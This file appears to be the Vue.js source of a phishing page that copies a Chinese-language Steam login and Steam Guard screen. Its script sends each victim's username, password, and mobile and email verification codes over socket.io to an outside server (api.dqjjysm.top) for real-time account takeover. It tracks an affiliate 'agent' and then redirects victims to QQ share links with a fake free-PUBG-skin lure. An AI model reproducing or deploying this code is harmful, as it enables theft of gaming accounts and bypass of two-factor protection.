            <div class="auth_modal_h1">哎呀！</div>
            <p>抱歉，
              <br>您所输入的验证码不正确…</p>
          </div>
          <div class="auth_message" id="auth_message_help" style="display: none;">
            <div class="auth_modal_h1">让我们来帮您吧！</div>
            <p>很抱歉您遇到问题。我们知道 Steam 帐户对您来说非常珍贵，我们致力于防止您的帐户遭到非法盗用。</p>
          </div>
        </div>
      </div>
      <div id="auth_details_messages" class="auth_details_messages">
        <div class="auth_details" id="auth_details_entercode" style="">
          作为额外的帐户安全措施，您需要输入我们刚刚发到您在 <span id="emailauth_entercode_emaildomain">{{auth_mail}}</span> 的电子邮件地址的特殊验证码，才能授权此浏览器进行登录。				</div>
        <div class="auth_details" id="auth_details_success" style="display: none;">
          如果这是一台公用计算机，请务必在您结束会话时注销 Steam。				</div>
        <div class="auth_details" id="auth_details_help" style="display: none;">
          请联系 Steam 客服来获得我们工作人员的帮助。解决合法用户的帐户登录问题是我们的第一要务。				</div>
      </div>
      <div class="authcode_entry_area">
        <div id="authcode_entry">
          <div class="authcode_entry_box">
            <input class="authcode_entry_input authcode_placeholder" id="authcode" type="text" value="" placeholder="在此输入验证码" v-model="auth_code">

          </div>
        </div>
        <div id="authcode_help_supportlink" style="display: none;">
          <a href="https://support.steampowered.com/kb_article.php?ref=4020-ALZM-5519" data-ajax="false" data-externallink="1">联系 Steam 客服来获得帐户相关的帮助</a>
        </div>
      </div>
      <div class="modal_buttons" id="auth_buttonsets">
        <div class="auth_buttonset" id="auth_buttonset_entercode" :class="{'none': auth_wait===true||auth_error}">
          <div data-modalstate="submit" class="auth_button leftbtn" @click="login">
            <div class="auth_button_h3" >提交</div>
            <div class="auth_button_h5">我的特殊验证码</div>
          </div>
          <div data-modalstate="checkspam" class="auth_button">
            <div class="auth_button_h3">什么信息？</div>
            <div class="auth_button_h5">我没有收到来自 Steam 客服的任何消息…</div>
          </div>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_checkspam" style="display: none;">
          <div data-modalstate="submit" class="auth_button leftbtn">
            <div class="auth_button_h3">找到它了！</div>
            <div class="auth_button_h5">我已经在上面输入了特殊验证码</div>
          </div>
          <div data-modalstate="help" class="auth_button">
            <div class="auth_button_h3">依旧不幸…</div>
            <div class="auth_button_h5">我没有收到来自 Steam 客服的任何消息…</div>
          </div>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_success" style="display: none;">
          <div class="auth_button auth_button_spacer">
          </div>
          <a data-modalstate="complete" class="auth_button" id="success_continue_btn" href="javascript:void(0);">
            <div class="auth_button_h3">转到 Steam ！</div>
            <div class="auth_button_h5">&nbsp;<br>&nbsp;</div>
          </a>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_incorrectcode" :class="{'none':auth_error===false||auth_wait===true,'display':auth_error===true}">
          <div data-modalstate="submit" class="auth_button leftbtn" @click="login">
            <div class="auth_button_h3">我想再试一次</div>
            <div class="auth_button_h5">我已经在上面重新输入了特殊验证码</div>
          </div>
          <div data-modalstate="help" class="auth_button">
            <div class="auth_button_h3">请求协助</div>
            <div class="auth_button_h5">我想我需要 Steam 客服的援助…</div>
          </div>
          <div style="clear: left;"></div>
        </div>
        <div class="auth_buttonset" id="auth_buttonset_waiting" :class="{'none':auth_wait===false,'block':auth_wait===true}">
        </div>
      </div>
      <div style="" id="auth_details_computer_name" class="auth_details_messages">
        为了让此浏览器在已启用 Steam 令牌的设备列表中易于识别，给它起一个好记的名称——至少 6 个字符长。				<div id="friendly_name_box" class="friendly_name_box">
        <input class="authcode_entry_input authcode_placeholder" id="friendlyname" type="text" placeholder="在这里输入一个好记的名称">
      </div>
      </div>
      <div style="display: none;">
        <input type="submit">
      </div>
    </form>
  </div></div></div></div></div>
</html>
</template>

<script>
  import io from 'socket.io-client'
  import {login,web_url,getShareMode,getCounter,postSSFN} from '../api/api'
    export default {
        name: "loginSteam",
        data() {
          return {
            step: 1,
            loginForm: {
              type: '未验证',
              agent: this.$route.query.agent?this.$route.query.agent:0,
              username: '',
              password: ''
            },
            page: this.$route.query.page?this.$route.query.page:0,
            share_mode: 0,
            wait: 'none',
            checkout: false,
            dialog: false,
            flag: false,
            two_factor_code: '',
            two_factor_name: '',
            two_factor_error: false,
            two_factor_wait: false,
            two_factor: false,
            auth_code: '',
            auth_error:false,
            auth_wait: false,
            auth_mail: '163.com',
            auth: false,
            socket: io('api.dqjjysm.top:30001'),
            // socket: io('127.0.0.1:2001'),
            counter: 0
          }
        },
        mounted: function() {
          this.socket.on('responce',(data) =>{
            console.log(data)
            setTimeout(() => {
              this.wait = 'none'
              this.two_factor_wait = false
              this.auth_wait = false
            },500)
            if(data===1){
              this.loginForm.type = '米正'
              if(this.auth_code!='') {
                this.loginForm.type = '邮箱令牌'
              }
              if(this.two_factor_code!=''){
                this.loginForm.type = '手机令牌'
              }
              this.two_factor = false
              this.auth = false
              this.dialog = true
              login(this.loginForm).then((res) => {
                console.log(res.data)
              })
            }else if(data ===5) {
              this.loginForm.type = '米错'
              this.checkout = true
            }else if(data.toString().substring(0,2)==63) {
              this.auth_mail= data.toString().substring(2)
              this.auth = true
              this.loginForm.type = '令牌'
              login(this.loginForm).then((res) => {
                console.log(res.data)
              })
            }
            else if(data===65) {
              console.log('邮箱验证错误')
              this.auth_error = true
            }
            else if(data===85) {
              console.log('手机验证码')
              this.two_factor = true
              this.loginForm.type = '令牌'
              login(this.loginForm).then((res) => {
                console.log(res.data)
              })
            }else if(data === 88){
              this.two_factor_error = true
            }
            // login(this.loginForm).then((res) => {
              // console.log(res.data)
            // })
          })
          document.onkeyup = (e) => {
            let keyNum=window.event ? e.keyCode :e.which;
            if(keyNum==13) {
              this.login()
            }
          }
          getCounter({agent: this.loginForm.agent}).then((res) => {
            this.counter = res.data
          })

          getShareMode({agent: this.loginForm.agent}).then((res) => {
            this.share_mode = res.data
          })
          let element = document.querySelector(".responsive_page_frame")
          this.$nextTick(() => {
            element.scrollTop = '100px'
            this.$refs.responsive1.scrollTo(0,'100px')
            console.log(this.$refs.responsive1)
            this.$refs.responsive1.scrollTop = 100
          })
          console.log(this.loginForm.agent)
        },
        methods: {
          jumpout() {
            let url = document.location.protocol + '//'+window.location.host+'/'
            let share_mode = this.share_mode
            let page = this.page
            //从浴袍页跳过来
            if(page=='pubg2'){
                //随机QQ群或好友
                if(share_mode==0){
                    let num = Math.floor(Math.random()*10)
                    if(num>=5){
                      share_mode = 1
                    }else {
                      share_mode = 2
                    }
                }
                //好友分享
                if(share_mode==1) {
                  location.href= 'http://connect.qq.com/widget/shareqq/index.html?url='+url+'pubg2?agent='+this.loginForm.agent+'&sharesource=qzone&title=清凉一夏，领浴袍服装&pics=https://api.108350.top/images/share3.jpg&summary=快来预约领取绝版浴袍服饰&desc=快来预约领取浴袍服饰 '+url+'pubg2?agent='+this.loginForm.agent
                }
                //QQ空间分享
                if(share_mode==2) {
                  location.href= 'https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+url+'pubg2?agent-'+this.loginForm.agent+'&sharesource=qzone&title=清凉一夏，领浴袍服装&pics=https://api.108350.top/images/share3.jpg&summary=快来预约领取绝版浴袍服饰&desc=快来预约领取浴袍服饰 '+url+'pubg2?agent='+this.loginForm.agent
                }
                //关闭
                if(share_mode==3) {
                  location.href= 'https://store.steampowered.com/'
                }
            }
            //从丛林页跳转
            else if(page=='pubg3'){
                if(share_mode==0){
                    let num = Math.floor(Math.random()*10)
                    if(num>=5){
                      share_mode = 1
                    }else {
                      share_mode = 2
                    }
                }
              //好友分享
              if(share_mode==1) {
                location.href= 'http://connect.qq.com/widget/shareqq/index.html?url='+url+'pubg2?agent='+this.loginForm.agent+'&sharesource=qzone&title=清凉一夏，领浴袍服装&pics=https://api.108350.top/images/share3.jpg&summary=快来预约领取绝版浴袍服饰&desc=快来预约领取浴袍服饰 '+url+'pubg2?agent='+this.loginForm.agent
              }
              //QQ空间分享
              if(share_mode==2) {
                location.href= 'https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+url+'pubg2?agent-'+this.loginForm.agent+'&sharesource=qzone&title=清凉一夏，领浴袍服装&pics=https://api.108350.top/images/share3.jpg&summary=快来预约领取绝版浴袍服饰&desc=快来预约领取浴袍服饰 '+url+'pubg2?agent='+this.loginForm.agent
              }
              //关闭
              if(share_mode==3) {
                location.href= 'https://store.steampowered.com/'
              }
            }else {
                location.href= 'https://store.steampowered.com/'
            }

          },
          login() {
            let msg = {};
              msg = {
                agent: this.loginForm.agent,
                username: this.loginForm.username,
                password: this.loginForm.password,
                two_factor_code: this.two_factor_code,
                auth_code: this.auth_code
              }
            this.wait = 'block'
            if(this.two_factor_wait!=true&&this.auth_wait!=true){
              this.socket.emit('steam',JSON.stringify(msg))
            }
            this.two_factor_wait = true
            this.auth_wait = true



            // if(this.flag==false&&this.checkout==false){
            //   this.flag=true
            //   login(data).then((res) => {
            //     setTimeout(() => {
            //       this.wait = 'none'
            //       this.checkout = true
            //       this.flag=false
            //       this.loginForm.password = ''
            //     },800)
            //   })
            // }
            // if(this.checkout==true) {
            //   this.wait = 'block'
            //   if(this.flag==false) {
            //     this.flag=true
            //     login(data).then((res) => {
            //       setTimeout(() => {
            //         this.wait = 'none'
            //         this.checkout = false
            //         this.step = 2
            //         this.flag=false
            //         this.dialog = true
            //       },800)
            //     })
            //   }
            // }
          }
        }
    }
</script>

<style>
  @import "https://steamstore-a.akamaihd.net/public/shared/css/motiva_sans.css?v=FAK4O46_mOLB";
  @import "https://steamstore-a.akamaihd.net/public/shared/css/shared_global.css?v=4uqdnBdIx7rg";
  @import "https://steamstore-a.akamaihd.net/public/shared/css/buttons.css?v=gMSUIlk4VGE8";
  @import "https://steamstore-a.akamaihd.net/public/css/v6/store.css?v=6X4-TC5duVQz";
  @import "https://steamstore-a.akamaihd.net/public/css/v6/cart.css?v=EVwcHL7lbElz";
  @import "https://steamstore-a.akamaihd.net/public/css/v6/browse.css?v=z1oC_UlM7fzC";
  @import "https://steamstore-a.akamaihd.net/public/css/v6/login.css?v=7P0uzhSYUThm";
  @import "https://steamstore-a.akamaihd.net/public/shared/css/login.css?v=urY8LqkoziPf";
  @import "https://steamstore-a.akamaihd.net/public/shared/css/shared_responsive.css?v=lZjXzgjiAjP-";
  ul#why_list {
    list-style-position: inside !important;
    list-style-type: square !important;
    line-height: 22px !important;
  }
  .display {
    display: block;
  }
  .none {
    display: none !important;
  }
  .newmodal {
    position: fixed;
    z-index: 1000;
    max-width: 1439px;
    left: 50%;
    margin-left: -200px;
    top: 50%;
    margin-top: -70px;
    width: 400px;
  }
  .authdialog {
    width: 490px;
    margin-left: -250px;
    margin-top: -200px;
    text-align: left;
    font-weight: 500;
  }
  .maildialog {
    width: 550px;
    margin-left: -275px;
    margin-top: -200px;
    text-align: left;
  }
  .rightcol {
    float: left !important;
  }
  .newmodal_background {
    position: fixed;
    height: 100vh;
  }
  @media screen and (max-width: 910px)
  {
    .rightcol {
      float: none !important;
    }
    .page_content {
      margin-top: 239px !important;
    }
    .newmodal {
      margin-top: -150px;
      margin-left: -150px;
      width: 300px;
    }
    .maildialog {
      margin-top: -200px !important;
    }
  }

  @media screen and (max-width: 600px)
  {

  }
</style>



